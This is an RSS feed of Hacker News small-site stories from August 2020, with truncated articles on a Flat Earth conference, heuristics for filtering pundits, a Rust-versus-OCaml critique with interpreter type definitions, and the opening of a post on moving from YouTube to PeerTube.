<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 50]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 50. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sat, 22 Aug 2020 08:21:17 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sat, 22 Aug 2020 08:21:17 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Notes from a Flat Earth Conference]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 126 (<a href="https://news.ycombinator.com/item?id=24223860">thread link</a>) | @willpatrick
<br/>
August 20, 2020 | https://www.willpatrick.co.uk/articles/notes-from-a-flat-earth-conference | <a href="https://web.archive.org/web/*/https://www.willpatrick.co.uk/articles/notes-from-a-flat-earth-conference">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>The First Duty</h2><p>The world is round. I’m confident about this. I say it as an opening disclaimer because, a little under two and a half years ago, I attended ‘FECON’ (an event less scatological than it sounds), the UK’s first ever Flat Earth Conference, to take portraits of the people who would be there. At the time, I was stunned by how there was even enough demand for it; I thought the matter had been laid to rest quite confidently some millennia ago. I’m not ashamed to say I was also morbidly curious about the people who would be going - both to speak and listen. Having said that, I also carried with me an optimism that it might not be so bad - there might be every possibility that the regular attendee would on average be more curious than conspiracist, and that maybe only a handful of people would turn up.</p><p>My optimism was largely a product of my lifelong interest in space and science and my faith that they will always win out. Among other things, I regularly stay up late to watch SpaceX launches and my favourite childhood TV show was <em>Star Trek: The Next Generation</em>, a show in which scientific analysis and long, diplomatic conversations always beat the lasers and trite quips of lesser SciFi. 'The first duty of every Starfleet officer,’ Captain Picard tells a junior officer in one stirring speech, ‘is to the truth - whether it is scientific truth, or historical truth or personal truth. It is the guiding principle upon which Starfleet is based.’ With virtually every after-school dinner of my youth eaten on board the Starship Enterprise, I became an adult imprinted with the progressive optimism and faith in science that Picard and his crew embodied.&nbsp;</p><p>With conspiracies still swirling unchecked in the wake of the Covid19 pandemic, that optimism would be quite helpful right now. Sadly, it was tackled firmly to the ground by one of the weirdest and most unsettling weekends I have ever experienced. On arrival at that conference, I had found myself thrust into an upside-down world where wrong is right, down is up, NASA is a scam and - don’t you see? - everything you’ve ever been told is a lie.</p><h2>I’ll Stick to the Coffee</h2><p>It’s April 2018 and I'm inside a dreary hotel in the centre of Birmingham. A damp, grey midlands afternoon dribbles outside, streaking dark rainwater down the decades-old concrete of the building. I am in one of a series of meeting rooms, joined together to make space for the weekend’s events. A brutal monolith from the outside, the building’s interior feels fractal - corridors lead to meeting rooms that open out into corridors that take you to more meeting rooms, <em>ad infinitum</em>. Each room nested inside this impossible vortex has the air of a low budget team-building 'away day', the kind with coloured post-its, mass-manufactured clicky hotel biros, bullet-pointed 'learning outcomes' and the kind of dreck coffee that you wouldn't be able to survive such an ordeal without. The carpets are patterned to disguise spills and flip charts stand huddled, white and bare, in the dark of each distant corner.</p><figure id="w-node-8b7ddc55f4a7-c39ae183"><p><img src="https://uploads-ssl.webflow.com/5e8b192239b9b4843e9ae18f/5f3d3d4d8db297621d004479_flat-earth-convention-0007.jpg" alt=""></p><figcaption>The view from the conferencing suite.</figcaption></figure><p>As I gulp my bad coffee with growing disquiet, I chat to someone who has just told me they drink their own urine to stay healthy and free of disease. Online, he's an enormously popular Flat Earth YouTuber. This weekend, he is one of the headline presenters. 'The biggest lie in history, <em>is</em> history,' he tells me, unprompted. 'You don't know who you are. You don't know where you're from.'</p><p>I had blundered, foolish and naive, into a world I didn't understand, where everyone around me believed - passionately, angrily, without the possibility of wavering - that the earth is anything but a sphere. That the odds are stacked against us. That our minds are being controlled. That the truth <em>is</em> out there, but it's being hidden from us in a grand conspiracy. I was peering over the edge of a rabbit hole down which every attendee had flung themselves with no hope of emerging. I forced another sip of body temperature coffee as I thought, perhaps not hard enough, about what to say next. 'So, what was it like the first time you drank your own piss?'</p><p>Months earlier I had sat in a small café around the corner from my cramped, rented London flat searching for a project to focus on before my seasonal photography work picked up in the Summer. My interests had always gravitated towards the corners of society that we don’t see much of - people on the fringe - but I was finding that gaining access to these communities was not always so easy. At the same time, I was spending probably too many hours on the internet, for better or worse, a byproduct of the free time I have every winter. My particular weakness was YouTube. In 2018, the Google-owned video platform had been straining for ever-higher viewing figures, massaging their algorithm to pump more and more videos in front of people at an alarming rate, showing them whatever performed best to keep them hooked. The strategy was working, but with unexpected side-effects.</p><figure id="w-node-a3e9d27ed9bc-c39ae183"><p><img src="https://uploads-ssl.webflow.com/5e8b192239b9b4843e9ae18f/5f3e31f8b1e8a282eeca29a9_flat-earth-convention-0003.jpg" alt=""></p><figcaption>A speaker presents a potential alternative to the heliocentric 'globe earth' model.</figcaption></figure><p>One of the more prominent side-effects was a surge in views for ‘flat earth’ videos. It seemed people were finding them addictive to watch and, over and over, the algorithm duly gave them the hit they wanted. To watch a clutch of these videos in a row is not just about learning that the earth is flat, but that everyone in power is in on the game - NASA and the governments of the world are covering up a huge lie. ‘Do your own research,’ goes the common refrain in many videos. With YouTube immediately recommending even more flat earth videos for you to watch, it was hard not to. For a good number of people I would later meet, these marathon flat earth video sessions were the thin end of the wedge that would send their lives spiralling into a darkness that would see them lose friends, jobs and, in some cases, families.</p><p>While browsing, I chanced across the most surprising by-product of the YouTube algorithm and rampant flat-earth video popularity: the conference itself. Wondering if this might be a chance I couldn’t possibly pass by, I contacted the organiser - an energetic and friendly guy, 'G' - and we ended up speaking on the phone for over an hour. We talked about the conference, who was speaking, how hard it was to arrange a big event (the catering budget was a pain in the neck) and, from time to time, he would earnestly ask me why I <em>still</em> believed the earth was round ‘given all the evidence to the contrary’. I tried to tell him that I didn't think it was a matter of belief, that it was a matter of fact. Finally, he agreed that I could attend in a press capacity but I would still need to pay for a ticket. Conferences aren’t cheap after all.</p><p>Satisfied that I had gained entry to an event where I would be able to meet dozens of people in this particularly unusual fringe (thereby making the whole process that much easier) I thought it would be a relatively simple exercise: turn up, meet some flat earthers, take some portraits, do some follow-up shoots and work on it over the course of the next few months to produce a cohesive series. Maybe I would even pitch it somewhere, to a magazine perhaps.</p><figure id="w-node-23e6444212f1-c39ae183"><p><img src="https://uploads-ssl.webflow.com/5e8b192239b9b4843e9ae18f/5f3d3d7bcd35408a7287fbb7_flat-earth-convention-0001.jpg" alt=""></p><figcaption>Entering the conference.</figcaption></figure><p>It didn’t work out that way. After the weekend had finished, I was deeply shaken. This piece is the result of over two years of halting edits, redrafts and uneasy procrastination. As the world around us reels from the Covid19 pandemic, conspiracies are still here and stronger than ever: Bill Gates supposedly wants to commit mass mind-control through vaccination, anti-mask/virus-hoax demonstrations fill the streets of educated cities and 5G masts burn by the dozen, condemned by the acolytes of a conspiracy that believes the virus <em>itself</em> is not a hoax but instead a 'plandemic' to reduce the size of the population, its spread hastened by the masts they target.</p><p>I feel like I should be surprised by it all. But I’m not. I just keep thinking about that conference. I think especially about how the minds of those that attended were such fertile soil for the seeds of doubt, disbelief and distrust in the scientific knowledge that has brought our species so far and still yet has the chance to save us from oblivion. So if I was ever going to write about that weekend, it’s either now or not at all.</p><h2>The Burden of Proof</h2><p>The opening event of the conference is standing room only. The first speaker stands at the front clasping a pint of strong French lager that he never drinks from throughout the next forty five minutes. The words 'Floaty Land' are on the slide projected behind him. ‘The burden of proof,’ he begins, ‘is only on us to prove the earth is <em>not</em> a ball.’ His presentation is the product of an experiment he'd tried on holiday by the coast not so long ago. He had lain prone where the beach meets the sea, pointing his digital camera at maximum zoom towards the islands on the horizon. Those islands, he had calculated, were higher than they should be, meaning that the earth was not as curved as most believed. <em>QED</em>, it must be flat. He continues, ‘Do I need to be an expert in maths, physics, astronomy? No. My peers have reviewed this work, and to me that’s as good as a peer review.’ </p><p>To show us the video he'd filmed from the surf, he briefly minimises the presentation to reveal his desktop background: a picture of planet earth taken from space. Booing erupts in the audience. He suppresses a grin.</p><figure id="w-node-b51967f51d18-c39ae183"><p><img src="https://uploads-ssl.webflow.com/5e8b192239b9b4843e9ae18f/5f3e33887c7c283c66bc3351_flat-earth-convention-0002.jpg" alt=""></p><figcaption>A slide from the 'Floaty Land' presentation on the first evening.</figcaption></figure><p>The next morning I learn that the flat earth is not the only conspiracy in play. I speak to a woman who believes that a human/reptile hybrid race is secretly controlling us all to serve an unknown agenda. A rigged banking system, the (ubiquitous) Illuminati, moon landings that never happened, 9/11-was-an-inside-job, 'false flag' school shootings with crisis actors and fake dead children, all of it pointing towards the same ominous conclusion: that the truth is …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.willpatrick.co.uk/articles/notes-from-a-flat-earth-conference">https://www.willpatrick.co.uk/articles/notes-from-a-flat-earth-conference</a></em></p>]]>
            </description>
            <link>https://www.willpatrick.co.uk/articles/notes-from-a-flat-earth-conference</link>
            <guid isPermaLink="false">hacker-news-small-sites-24223860</guid>
            <pubDate>Thu, 20 Aug 2020 14:50:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Who to ignore – bullshit filters]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 24 (<a href="https://news.ycombinator.com/item?id=24223701">thread link</a>) | @ernopp
<br/>
August 20, 2020 | https://ernest.oppet.it/2020/08/14/who-to-ignore/ | <a href="https://web.archive.org/web/*/https://ernest.oppet.it/2020/08/14/who-to-ignore/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<figure><img data-attachment-id="342" data-permalink="https://ernest.oppet.it/covid-wrong/" data-orig-file="https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg" data-orig-size="1600,1309" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="covid-wrong" data-image-description="" data-medium-file="https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg?w=300" data-large-file="https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg?w=1024" src="https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg?w=1024" alt="" srcset="https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg?w=1024 1024w, https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg?w=150 150w, https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg?w=300 300w, https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg?w=768 768w, https://ernopp.files.wordpress.com/2020/08/covid-wrong.jpeg 1600w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p><em>By Gabriel and Ernest Oppetit</em></p>



<p>Unforseen shit happens. 9/11, the 2008 crash, Brexit, Trump, COVID-19… you know the story.&nbsp;</p>



<p>These events surprised us because our information diets are dominated by people who didn’t see them coming. Many of these people are paid for sounding good (or protecting a certain interest), not for being right, so unfortunately we still hear just as much of them.</p>



<p><strong>So it’s on us as readers to improve our information diet to get better commentary and predictions. “Listen to the experts” doesn’t cut it. By definition of course we should listen to them, but finding them by title or pedigree within specific disciplinary boundaries got us to where we are… so again, it’s on us readers to find the experts.</strong></p>



<p>Spoiler alert: we haven’t found them. What we have started is to figure out predictors for catching people who get it wrong a lot, and are causing harm to our information diets. “<em>primum, non nocere</em>“: “first, do no harm”, as the Ancients said, then we can look to supplement our diets with better inputs. </p>



<p>So, here’s a set of bullshit-detection filters, through which you can pass any new prediction or pundit. <strong>These are <em>heuristics</em>, not hard-and-fast rules. </strong>They definitely shouldn’t replace objective evaluations of arguments you hear, regardless of who they might come from!</p>



<hr>



<h2>Bullshit filter #1: Are they free to speak their minds?</h2>



<figure><img src="https://ernopp.files.wordpress.com/2020/08/68b57-12rqhripnxwiwk_1b_e1bha.png" alt="How I used Puppeteer to build a complete Facebook Birthday Wisher ..."></figure>



<blockquote><p><em>“Don’t ask a barber if you need a haircut”</em></p></blockquote>



<p>Who/what pays the bills?&nbsp;How can you know if they really believe what they’re saying?</p>



<ul><li><strong>If they are in an institution – who funds it? </strong>To what extent could they divert from the “party line” of that institution? For example, how free is the Education Ministry to say that the system is in dire need of reform?</li><li><strong>If they are in a company – what are the incentives of the company? </strong>Who controls it and has a fiduciary duty to the shareholders (to maximise enterprise value)? For example, how free would Nike be to say that running with shoes with a much smaller and “low-tech” sole is better for one’s health? (This example happened and is well told in <a href="https://smile.amazon.co.uk/Born-Run-Hidden-Ultra-Runners-Greatest/dp/1861978774/ref=sr_1_1?dchild=1&amp;keywords=born+to+run&amp;qid=1597931504&amp;sr=8-1">Born to Run</a>) &nbsp;</li><li><strong>As an individual, what are their incentives? </strong>Do they own positions or business interests they might be “talking up”?&nbsp;Is the angel investor invested in Revolut going to share any negative news about them, or only the positive which they are incentivised to share? </li></ul>



<p>Apply additional scrutiny and question motives based on these answers.</p>



<p><strong>Conversely</strong>: are they going <em>against </em>the “party line” of the company/institution/community they’re in, and taking on risk as a result? (“whistleblowing” being the extreme version of that). This could provide additional signal that they really believe what they’re saying.</p>



<hr>



<h2>Bullshit filter #2: Does their livelihood depend on being right?</h2>



<figure><img src="https://images.unsplash.com/photo-1521484033668-adce3738dc9e?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1000&amp;q=80" alt="man mountain climbing during daytime" width="808" height="537"></figure>



<blockquote><p><em>“There are two kinds of people: those who like to win, and those who like to win arguments” </em></p><cite><em>Nassim Taleb</em></cite></blockquote>



<p><strong>What happens to them if they’re wrong</strong>? If they predicted something incredibly wrongly, would they be more likely to lose their job? Or are their jobs tied to other indicators, such as reader/viewership rather than “correctness” of the analysis?&nbsp;</p>



<p>The classic example here is “talking heads” – full-time columnists, pundits, interviewers, bloggers – whose careers can thrive independently of the correctness of their predictions. Paul Krugman comes to mind. His extremely wrong prediction about the Internet, or about the impact of Trump’s election on the economy, have not caused him to lose any stature: he maintains his NYT column and high readership. (Note: as <a href="https://ernest.oppet.it/2020/06/04/superforecasting/">Superforecasters</a> will tell you, there still is value in listening to them for the questions and scenarios they raise, but their predictions should be heavily discounted)</p>



<p>A telling sign of this group is that they often shy away from providing <em>testable</em> predictions, which could be unambiguously disproven later. Keeping things vague provides enough wiggle-room to keep an “I told you so” stance. </p>



<p>Beware of reading too much into predictions from this group: <strong>remember they got to where they are more from sounding good than from being right.&nbsp;</strong></p>



<p><strong>Conversely: </strong>listen more carefully to people whose livelihood depends on being right and who have been provably right a lot (this is the well-publicized “skin in the game” factor). The easiest proof is people who have been paid by the market for being right: they took on a position or built a service, and the market decided over sufficient time on the correctness of that position or value of the service. (One interesting side-effect of this group is they tend not to be confined to academic boundaries: they follow the questions wherever they lead because they’re chasing an outcome, not recognition in a given field.)</p>



<p><strong>Side-note</strong>: it’s likely that some predictions are deliberately wrong. When Elon Musk says “we will have a full self driving robo-taxis in 2 years” or “we will be on Mars in 10” it seems likely to us that he doesn’t truly believe that, but he’s incentivised to say it. The cost is negligible (a few bad headlines perhaps) but the upside is high: it motivates the troops and helps with branding &amp; recruiting.)</p>



<hr>



<h2 id="block-44a385a6-0046-4792-8210-7bbc9ccd6e5d">Bullshit filter #3: Do they take cyberspace seriously?</h2>



<figure><img src="https://images.unsplash.com/photo-1543722615-dbf5edf1a00d?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1000&amp;q=80" alt="green and brown abstract painting" width="771" height="509"></figure>



<blockquote><p><em>“The spread of computers and the internet will put jobs in two categories: people who tell computers what to do, and people who are told by computers what to do.” </em></p><cite><em>Marc Andreessen&nbsp;</em></cite></blockquote>



<p>This criterion is a little less conventional, and more of a personal belief… so hear us out.&nbsp;</p>



<p>We are living in an age in which the balance of power is being overturned by information technology.  </p>



<ul><li>Some kids (early teens) are <a href="http://twitter.com/ErnOpp/status/1257945232504651776">making 100s of thousands of dollars programming games Roblox</a></li><li>100s of people are letting <a href="http://twitter.com/ErnOpp/status/1248640795382603777">an open-sourced (built by a team of 12 people in California) AI hack into their cars’ control systems to drive</a> them around&nbsp;</li><li>We’re on the cusp of making <a href="http://twitter.com/ErnOpp/status/1246799806942646273">photorealistic digital humans</a>, an important building block of the <a href="https://www.matthewball.vc/all/themetaverse">Metaverse</a></li></ul>



<p>In other words: geeks will inherit the Earth.&nbsp;We are moving from the Industrial Age to the Knowledge age, and <a href="https://ernest.oppet.it/2018/03/23/the-world-is-moving-from-scarcity-of-capital-to-scarcity-of-attention/">from scarcity of Capital to scarcity of Attention</a>. Software and the Internet enable “permissionless innovation” where the best product wins and has very low cost distribution: this is changing the world.</p>



<p><strong>It’s important to listen to people who know that this is happening, and take it very seriously</strong>. They have a deep appreciation and respect for the engineer’s “craft”, and they are either building for this new world or they build networks and information diets to stay close to these developments.&nbsp;</p>



<p>It’s such an important change in society that the opinion and predictions of those who don’t get this or are “wishing it away” nostalgically should be discounted. </p>



<hr>



<h2>Conclusion </h2>



<p>We’ve laid out a few heuristics we think are helpful to keep in mind when evaluating arguments and predictions, and to construct a healthy information diet. </p>



<ol><li>As Munger said: “Show me the incentive and I’ll show you the outcome.” <strong>Be wary of views coming from people who are not free to speak their minds on the topic at hand</strong>, because of their existing incentives.</li><li>Favour views from those who get paid for being right, <strong>discount views from those who get paid for <em>sounding </em>right.</strong></li><li><strong>The balance of power is being overturned by information technology.</strong> Favour people who deeply understand it and work it into their world view. </li></ol>



<p>The good news is that lots of writers are going solo as the distribution cost of media has gone to 0. So (1) we have more writers who are their own boss, whose incentives are less likely to get polluted by bullshit filter #1, and (2) we can more easily follow writers (eg Bill Bishop) instead of institutions (eg the NYT) which enables for more granular filtering.</p>



<p>Happy curating!</p>



<p><em>PS: As a follow up we’ll post a list of people who we’ve find consistently pass these filters and have been righter than most on a few big predictions / events.</em></p>
	</div><div>
				<p><strong>Published</strong>
			<time datetime="2020-08-14T11:39:58+01:00">August 14, 2020</time><time datetime="2020-08-20T17:49:21+01:00">August 20, 2020</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://ernest.oppet.it/2020/08/14/who-to-ignore/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24223701</guid>
            <pubDate>Thu, 20 Aug 2020 14:35:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on Rust vs. OCaml]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 18 (<a href="https://news.ycombinator.com/item?id=24223018">thread link</a>) | @pbiggar
<br/>
August 20, 2020 | https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/ | <a href="https://web.archive.org/web/*/https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.darklang.com/content/images/size/w300/2020/08/A_rather_rusty_camel_-_geograph.org.uk_-_294944.jpg 300w,
                            https://blog.darklang.com/content/images/size/w600/2020/08/A_rather_rusty_camel_-_geograph.org.uk_-_294944.jpg 600w,
                            https://blog.darklang.com/content/images/size/w1000/2020/08/A_rather_rusty_camel_-_geograph.org.uk_-_294944.jpg 1000w,
                            https://blog.darklang.com/content/images/size/w2000/2020/08/A_rather_rusty_camel_-_geograph.org.uk_-_294944.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.darklang.com/content/images/size/w2000/2020/08/A_rather_rusty_camel_-_geograph.org.uk_-_294944.jpg" alt="First thoughts on Rust vs OCaml">
            </figure>

            <section>
                <div>
                    <p>I'm about two weeks into Rust now, so this feels like a good time to write a critique, before I get Stockholm Syndrome'd.</p><p>My main motivation in learning Rust is that I have to maintain some of <a href="https://github.com/darklang/dark/tree/main/stroller">Dark's Rust code</a>. There was a <a href="https://blog.darklang.com/a-fun-bug/">recent outage</a> related to that code, and I had to learn on the fly, so better to actually know what I'm looking at.</p><p>I've also been dreaming of rewriting <a href="https://darklang.com/">Dark</a> in Rust for quite some time, largely due to frustrations with OCaml as well as some excellent marketing by the Rust community. I'm trying to evaluate whether this is a good idea, and if so, trying to figure out how to do it in a way that makes sense (which is to say, gradually).</p><p>By the way, <a href="https://darklang.com/">Dark</a> is platform for building backend apps; in practice it's a HTTP server and database (which comprise the "Dark platform") which connect to an interpreter for the Dark programming language, which you edit using the Dark editor. The interpreter is the core of the language, it runs in Kubernetes in Google Cloud, as well as compiled to JS in the browser. Today, <a href="https://github.com/darklang/dark">almost everything is implemented</a> in OCaml.</p><p>So far I've spent a few weeks learning Rust, and I have to say, I like lots of things about Rust but I definitely don't love it yet.</p><p>The lens I use when talking about programming languages is <a href="https://blog.darklang.com/what-is-dark/">Accidental Complexity</a>, which is basically what Dark is all about (removing it, that is). So when I critique something, it's largely based on whatever bullshit hoops I feel it makes me jump through.</p><p>I'll be complaining about both OCaml and Rust below, so if you're a fan of either, prepare yourself. Remember, all programming languages suck, especially whichever one is your favorite.</p><p>There's a few things that Rust does very well, that OCaml really does not. I had hoped that OCaml would improve over the years, and for sure there's progress being made, if slow. But once you come face to face with a language that does it well, the difference is really stark!</p><p>People say Rust is a fringe language, but as someone who's been coding in a truly fringe language (OCaml, and Clojure before that), Rust feels huge. There's tons and tons of ways to learn: an impressive tutorial (and lots of community tutorials as well), multiple books, StackOverflow questions, blog posts, videos. Not only that, but there's lots aimed at beginners; often it feels like OCaml blog posts are aimed at hardened professionals or academics. I recall finding it very very hard to get into, and especially hard to figure out how to write idiomatic OCaml, which I have not found with Rust at all.</p><h2 id="libraries">Libraries</h2><p>It's amazing - Rust has libraries for everything!! I've really been struggling with the dearth of libraries in OCaml. A year or two ago we were chatting to Google Cloud about deficiencies in Cloud SQL Postgres, and got told that Cloud SQL is only really there to tick boxes, we should move to <a href="https://cloud.google.com/spanner">Spanner</a> instead. Except OCaml has no Spanner library, so we're stuck on Cloud SQL. Repeat this 50 times for 50 different vendors and services, and you start to get frustrated.</p><p>The tooling is Rust is also fabulous. In particular, <code>Cargo</code> is probably the best build system I've ever used. The fact that they have integrated the package manager, the build system, and the compiler, and then it all just works? Magic!</p><p>By contrast, in OCaml you have <a href="https://opam.ocaml.org/">opam</a>, <a href="https://esy.sh/">esy</a>, <a href="https://dune.build/">dune</a>, and <a href="https://ocaml.org/">OCaml itself</a> all doing part of the job. They sorta kinda mostly work well together, until they don't. And as you wire them together, you really need to understand what each tool does, where it starts and stops, and how they integrate. Honestly, not fun at all.</p><p>The frontend is also confusing: there's the Bucklescript stuff, the ReasonML stuff, the OCaml compiler stuff, the Javascript stuff. But recently a nice improvement - they made it <a href="https://rescript-lang.org/">just one thing</a>! So, some improvements there at least!</p><p>The editor tooling is also great in Rust. The <a href="https://github.com/rust-lang/rls">Rust Language Server</a> "just works" (at least in VS Code), whereas I've had a lot of trouble with setting up OCaml editor integration. I once had it finally working really well, and then I changed something in my OCaml config and have been unable to bring it back.</p><p>I'm going to put my Dark biases to work here and speculate that all this amazingness is because Rust is mostly an integrated system: the same people are building all of these tools (if not the same exact humans, at least a group of people working towards the same goals). Whereas it doesn't feel that way in OCaml at all.</p><p>OCaml feels like a completely separate camps, where Facebook, Inria, Jane Street, and OCaml Labs, all sorta work on their own stuff and that few if any of them talk to each other. That's an outsider view (<a href="https://youtu.be/EnPodoPzimE?t=1837">one I've voiced before</a>) and possibly wrong, but if you folks do speak, maybe integrate a few of these projects and lower the cognitive overhead of learning all this stuff? Wouldn't it be great if there was a single tool as simple and powerful as Cargo for the entire OCaml/Reason ecosystem?</p><h2 id="macros">Macros</h2><p>Macros in Rust are great! OCaml has PPXes, which are separate binaries that you build using the OCaml compiler toolkit. They have a very high barrier to entry, and I've never built one, and really struggled to even understand the ones I use. They also seem to be <a href="https://blog.janestreet.com/an-solution-to-the-ppx-versioning-problem/">having a lot of trouble over the last few years</a>.</p><p>Macros in Rust are built into the language. It feels a little like doing a regex over part of the syntax tree (with the same downsides, honestly), which is to say that they're pretty easy to get started and do quite powerful stuff with, even if they're not that powerful.</p><p>They do actually seem to lack some of the power of OCaml's PPXes. With OCaml's PPXes, I believe you can access the entirety of the compiler, with all of the upsides (do anything!) and downsides (compatibility between versions). However, with Rust I seem to have much less access - unless I'm mistaken I can't actually get it to parse type information for generics that I could then repurpose, which is frustrating.</p><p>They seem to be easier to write than Clojure's macros, though also less powerful. Given that Lisp/Clojure is entirely designed around treating code as data, and there's so little syntax, this makes sense. But still, pretty nice!</p><h2 id="aesthetics">Aesthetics</h2><p>Rust feels really well designed, which I expect is because they've aggressively pruned the parts of the language that don't make sense. So the Rust that I see today is supposably quite different from the Rust of 2010. Meanwhile, OCaml has a ton of stuff that they really should prune and have not.</p><p>Similarly, Rust the language is quite pretty, syntax-wise. Meanwhile, OCaml is so ugly that the community came up with a <a href="https://reasonml.github.io/">whole other syntax</a> for it. This shouldn't be a big deal, but as someone responsible for getting folks up to speed on OCaml for a few years, this was not a fun experience.</p><p>Apologies to the OCaml folks for being the victims of my frustrations so far; time to talk about Rust. First, some expectations: I've been working on Rust for two weeks, and a lot of that was doing the tutorial, worked examples, etc. But I do have a lot of experience with OCaml and Clojure, and also significant experience in C and C++. I've also been programming professionally for about 20 years, mostly in compilers and programming language implementations. So I feel Rust should be straightforward.</p><p>While we're talking about me, here's a fun anecdote about my first experience with Rust: In 2010, I started work at Mozilla. For my first day, they flew me to Whistler for their annual retreat, and I got to see Graydon Hoare present the thing he'd been working on for 4 years in secret: a new programming language called Rust! I excitedly bounded up to him to offer help: I know compilers, I love languages, I can help!! Unfortunately, though I tried I didn't get very far in helping, as I really couldn't get my head around the language that Rust was implemented in at the time, which was an esoteric academic language called "OCaml"!</p><h2 id="memory-management">Memory management</h2><p>I was actually surprised at how little the actual memory management bothered me. I'm a big believer in garbage collection, and not having to think about memory, so I expected to hate this part of Rust, but it turns out it's kinda OK. You put everything in a <code>Box::new</code> (regular heap memory) or <code>RC::new</code> (reference counted memory) or <code>Arc::new</code> (reference counted memory suitable to be used concurrently in different threads), and then when they go out of scope they'll be cleaned up.</p><p>This actually seems kinda OK, especially when I compare it to writing C++ back in the day. I've only built the very small part of an interpreter so far, but I'm expecting that if I take care of scopes properly, the memory will just sort of manage itself? Not as good as garbage collection IMO, but not as bad as I'd heard.</p><h2 id="pattern-matching">Pattern matching</h2><p>I was initially excited that Rust has pattern matching, since that's something every language should have (<a href="https://www.python.org/dev/peps/pep-0622/">and maybe will soon</a>). However, I pretty quickly learned to be less excited about this.</p><p>Let's quickly look at some interpreter code to see why.</p><pre><code>type t =
  | EInteger of id * string
  | ELet of id * string * t * t
  | ELambda of id * (analysisID * string) list * t
  | EVariable of id * string
  | EFnCall of id * string * t list * sendToRail
[@@deriving show {with_path = false}, eq, ord, yojson {optional = true}
</code></pre><p>This is a cut down version of <a href="https://github.com/darklang/dark/blob/a5a008ec0307a199bf501cf84181ab41fee56745/libshared/FluidExpression.ml#L10">the original</a> in OCaml.</p><pre><code>#[derive(Debug)]
pub enum Expr_ {
  Let {
    var: String,
    rhs: Expr,
    body: Expr,
  },
  FnCall {
    name: FunctionDesc_,
    args: im::Vector&lt;Expr&gt;,
  },
  Lambda {
    params: im::Vector&lt;String&gt;,
    body: Expr,
  },
  Variable {
    name: String,
  },
  IntLiteral {
    val: i32,
  },
}

pub type Expr = Arc&lt;Expr_&gt;;
unsafe impl Send for Expr_ {}
unsafe impl Sync for Expr_ {}
</code></pre><p>So we can see the same type here in two different languages. In OCaml, you just specify the type. In Rust, you specify the type and also the garbage collection strategy - you can't just put an <code>Expr</code> in …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/">https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/</a></em></p>]]>
            </description>
            <link>https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24223018</guid>
            <pubDate>Thu, 20 Aug 2020 13:31:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Moving from YouTube to PeerTube]]>
            </title>
            <description>
<![CDATA[
Score 414 | Comments 286 (<a href="https://news.ycombinator.com/item?id=24222661">thread link</a>) | @djsumdog
<br/>
August 20, 2020 | https://battlepenguin.com/tech/moving-from-youtube-to-peertube/ | <a href="https://web.archive.org/web/*/https://battlepenguin.com/tech/moving-from-youtube-to-peertube/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <section>

  

  <article>
    

    <figure>
  
  <img src="https://battlepenguin.com/images/tech/peertube/500px-Sepia.svg.png" alt="Sepia, Peertube's mascot">
  
  
  <figcaption>
      

      Sepia, Peertube's mascot

      
  </figcaption>
  
</figure>

